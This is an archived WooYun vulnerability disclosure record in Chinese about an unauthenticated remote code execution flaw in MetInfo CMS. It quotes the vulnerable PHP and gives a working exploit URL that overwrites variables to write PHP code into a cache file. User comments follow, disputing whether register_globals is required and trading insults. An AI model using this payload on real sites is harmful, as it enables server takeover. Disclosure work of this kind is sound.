{"id": 44134, "wybug_id": "wooyun-2015-094886", "wybug_title": "MetInfo 无需登录前台直接GETSHELL", "wybug_corp": "MetInfo", "wybug_author": "menmen519", "wybug_date": "2015-02-02 13:12", "wybug_open_date": "2015-05-03 13:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-03：\t细节向公众公开  简要描述： MetInfo 无需登录前台GETSHELL 看着metinfo 注入都两个$$ @疯狗 @Finger来一道闪电吧  详细说明：  metinfo整体做的还算不错，但是一个小疏忽，越权导致大漏洞代码如下：admin/include/common.inc.php 由于之前在最外围进行了一次参数解析，所以这里可以通过全量覆盖过来先不说这里，一会儿用得上，我们看一下admin/include/lang.php:\nif($_GET[langset]!=\"\" and $met_admin_type_ok==1){$languser = $_GET[langset];}$langset=($languser!=\"\")?$languser:$met_admin_type;if(!file_get_contents(ROOTPATH.'cache/langadmin_'.$langset.'.php')){\t$js=\"var user_msg = new Array();\\n\";\t$query=\"select * from $met_language where lang='$langset' and site='1' and array!='0'\";\t$result= $db->query($query);\t\tif($db->affected_rows()==0){\t\trequire_once ROOTPATH_ADMIN.'system/lang/lang.func.php';\t\t$post=array('newlangmark'=>$langset,'metcms_v'=>$metcms_v,'newlangtype'=>'admin');\t\t$file_basicname=ROOTPATH_ADMIN.'update/lang/lang_'.$langset.'.ini';\t\t$re=syn_lang($post,$file_basicname,$langset,1,0);\t\t$query=\"select * from $met_language where lang='$langset' and site='1' and array!='0'\";\t\t$result= $db->query($query);\t}\twhile($listlang= $db->fetch_array($result)){\t\tif(substr($listlang['name'],0,2)=='js'){\t\t\t$tmp=trim($listlang['value']);\t\t\t$js=$js.\"user_msg['{$listlang['name']}']='$tmp';\\n\";\t\t}\t\t$name = 'lang_'.$listlang['name'];\t\t$$name= trim($listlang['value']);\t\t$str.='$'.\"{$name}='\".str_replace(array('\\\\',\"'\"),array(\"\\\\\\\\\",\"\\\\'\"),trim($listlang['value'])).\"';\";\t}\t//echo $str;\t$js1='$'.\"js='\".str_replace(\"'\",\"\\\\'\",$js).'\\';';\t$str=\"<?php\\n\".$str.$js1.\"\\n?>\";\tfile_put_contents(ROOTPATH.'cache/langadmin_'.$langset.'.php',$str);}else{\trequire_once ROOTPATH.'cache/langadmin_'.$langset.'.php';}\n第一步：if($_GET[langset]!=\"\" and $met_admin_type_ok==1){$languser = $_GET[langset];}这里我们全量覆盖met_admin_type_ok=1 就可以直接赋值无过滤赋值$languser怎么能让这一句成立!file_get_contents(ROOTPATH.'cache/langadmin_'.$langset.'.php')第一我们得定义ROOTPATH第二我们知道，php一个全版本的小bugfile_put_contents(\"d:/a.php/../a.php\")这种是不会报错的 但是对于langset 他有限制条件，我们怎么逾越这个条件 此时猜想，若果有一个地方也越权，并且include了lang.phpcommon.inc.php:\nif(!is_array($met_langadmin[$_GET[langset]])&&$_GET[langset]!='')die('not have this language');if($_GET[langset]!=''){\t$_GET[langset]=daddslashes($_GET[langset],0,1);\tchange_met_cookie('languser',$_GET[langset]);\tsave_met_cookie();}$_M['user']['cookie'] = $met_cookie;$metinfo_admin_name     = get_met_cookie('metinfo_admin_name');$metinfo_admin_pass     = get_met_cookie('metinfo_admin_pass');$metinfo_admin_pop      = get_met_cookie('metinfo_admin_pop');$metinfo_admin_shortcut = get_met_cookie('metinfo_admin_shortcut');$languser               = get_met_cookie('languser');$langadminok            = get_met_cookie('metinfo_admin_lang');$langusenow=$languser;if($langadminok<>\"\" and $langadminok<>'metinfo')$adminlang=explode('-',$langadminok);require_once ROOTPATH_ADMIN.'include/lang.php';\n发现了在此处引入，下来我们看if(!is_array($met_langadmin[$_GET[langset]])&&$_GET[langset]!='')die('not have this language');如果met_langadmin参与运算的结果是个数组，这时候langset 就完全可控制后面走到了lang.php:1.!file_get_contents(ROOTPATH.'cache/langadmin_'.$langset.'.php') 此处要是个空文件 2.$query=\"select * from $met_language where lang='$langset' and site='1' and array!='0'\";\t$result= $db->query($query);这个查询为空，langset经过构造后  这个肯定是个空 3.$js1='$'.\"js='\".str_replace(\"'\",\"\\\\'\",$js).'\\';';\t$str=\"<?php\\n\".$str.$js1.\"\\n?>\";\tfile_put_contents(ROOTPATH.'cache/langadmin_'.$langset.'.php',$str);发现$str 就可以没有任何给它初始化，直接全局覆盖过来即可发送url:http://localhost/metinfo/admin/include/common.inc.php?met_admin_type_ok=1&langset=123&met_langadmin[123][]=12345&str=phpinfo%28%29%3B%3F%3E%2f%2f直接就会在cache目录下创建一个文件langadmin_123.php内容为：<?phpphpinfo();?>//$js='var user_msg = new Array();';?>访问以下\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-02 13:22 厂商回复： 是系统漏洞，感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-02 13:19 |    \t\tnony \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:13        | Not do is die...)\t\t \n  真得给你一道闪电    \n     2015-02-02 13:21 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @nony 官网直接都能shell 没人给啊 哀！！！！    \n     2015-02-02 13:31 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @MetInfo 瞬间修复 神速啊     \n     2015-02-02 13:50 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  妈妈问我为什么跪着看乌云    \n     2015-02-02 14:31 |    \t\trpbswt \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | test my)\t\t \n  @roker  为什么    \n     2015-02-02 17:26 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  你的大腿好性感啊    \n     2015-02-02 18:26 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @MetInfo 赶紧修复呗 ;3    \n     2015-02-06 12:23 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  这个洞要开启 register_global，太鸡肋了-.-我还以为是 metinfo 的自身导致的 getshell    \n     2015-02-06 12:30 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @Ricter -.- metinfo不是也是像qibo那样伪全局的吗    \n     2015-02-06 12:46 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @′雨。 @Ricter 但是官网 让哥就给shell了    \n     2015-02-06 15:15 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  还是admin后台的，怎么都是一些鸡肋漏洞。。汗！！！！！！！！！！！！    \n     2015-02-06 15:34 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @狗狗侠 后台可以直接访问    \n     2015-02-06 17:29 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @狗狗侠 这位洞主的很多漏洞都分析过，鸡肋的就算了，很多都是自己把代码改了意淫之后才能复现。。。O.O。。难道是我水平问题？    \n     2015-02-06 17:45 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @menmen519 恼羞成怒了么~~~洞主那些本地意淫的漏洞真不敢苟同    \n     2015-02-06 23:18 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @Ricter @狗狗侠 @Stefanie 为什么好像你们都知道细节的样纸。。    \n     2015-02-06 23:41 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @Stefanie @roker  观看了洞主很多漏洞，能对线上业务系统造成危害的确实很少，希望洞主能发一些确实能危害到应用系统的漏洞，如果伪造或者鸡肋到不能再鸡肋的漏洞请标注，别放大了实际危害范围，同时希望乌云能加大审核力度，@xsser  @疯狗  @Finger    \n     2015-02-06 23:51 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @狗狗侠 赞    \n     2015-02-07 00:23 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @狗狗侠 @roker 我知道他为什么能知道细节，要么就我哥们告诉他了 要么就以绿盟合作关系看到的 真他妈当年去研究院没见到这B 以后哥发的漏洞你们最好别看 真他妈晦气    \n     2015-02-07 08:13 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @狗狗侠 @xsser @疯狗 @Finger @MetInfo 逻辑漏洞 越权漏洞 xss漏洞 都不算漏洞? sql注入拿不下系统也不算漏洞？  厂商又不傻 如果这个危害不大，怎么秒确认 而且给20rank 别一天能提前看到漏洞 就这里泄露一下 那里泄露一下，那就请wooyun给出来明确说法，能搞到系统的才算漏洞，那这样大家都愉快多了     \n     2015-02-07 10:34 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  你多看看你发的这个漏洞评论吧 WooYun: Discuz！旗下产品统一存在一个csrf+sql批量执行风险（dz3.x,dz7.x,SupeSite7.x等等）    \n     2015-02-07 16:54 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @menmen519  哎哟。。吓尿了。。。还你哥们告诉我。。。还绿盟的账号。。。。我真的是给跪了。。。    \n     2015-02-07 16:59 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Stefanie  别自以为是了 你以为哥说你呢 你还没到那个级别    \n     2015-02-07 17:06 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Stefanie 把自己那一块做好 跟着别人瞎嚷嚷 一般没本事的 就喜欢跟着别人 起哄  我一般都懒的理你这类人 有种你也发出来让我看看    \n     2015-02-08 09:58 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  http://zone.wooyun.org/content/18562    \n     2015-02-08 10:17 |    \t\terror \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:96        )\t\t \n  坐等漏洞公开~~    \n     2015-02-08 10:32 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  不好意思''就是我看出你这是意淫的''才有人发帖了'''我做好自己''下次你发一个我分析一个'''    \n     2015-02-08 12:05 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @menmen519 另外，我就想问问什么是瞎嚷嚷，我第一时间看到这个漏洞并发现是意淫的，你以为我没看漏洞么，叫瞎嚷嚷么？来给我解释解释哈~~咱别给NS丢人行不    \n     2015-02-08 12:09 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Stefanie 你还不是瞎嚷嚷，连聊天记录都没有看明白的人，歇歇吧    \n     2015-02-08 12:41 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  @menmen519 @′雨。 admin/include/common.inc.php 没有伪全局的，自己试试咯    \n     2015-02-08 12:49 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @Ricter 学习了 r牛就是屌。-.-    \n     2015-02-08 13:10 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @menmen519 就想问问，你这个phpinfo怎么出来的，不是意淫的么，哈哈，这次不需要手动修改代码才能让漏洞利用成功了？自己心里比谁都明白，还老在这装着玩，就这样吧，我也确实没时间再搭理了，以后没人意淫漏洞了我也省的分析了    \n     2015-02-08 22:23 |    \t\tagnes0621 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | a)\t\t \n  @Stefanie 这个洞有限定条件，你都看到细节了，还不知道咋回事，确实是水平问题。    \n     2015-02-09 11:24 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @agnes0621 不好意思我是看出你开启了 register_globals在意淫漏洞，还故意不说需要开启什么，所以才喷你的，换个马甲就不认识你了？    \n     2015-02-09 14:13 |    \t\tagnes0621 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | a)\t\t \n  @Stefanie 看了这么多评论，你终于看出来了，水平不错。懒得鸟你    \n     2015-03-02 14:43 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  @agnes0621 呵呵，是我最先看出来，才找了那么多人骂你。。哈哈。。你知道乌云的帖子怎么来的么。。。。    \n     2015-07-16 23:12 |    \t\t龟兔赛跑 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:29        | 初学者)\t\t \n  没$了？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}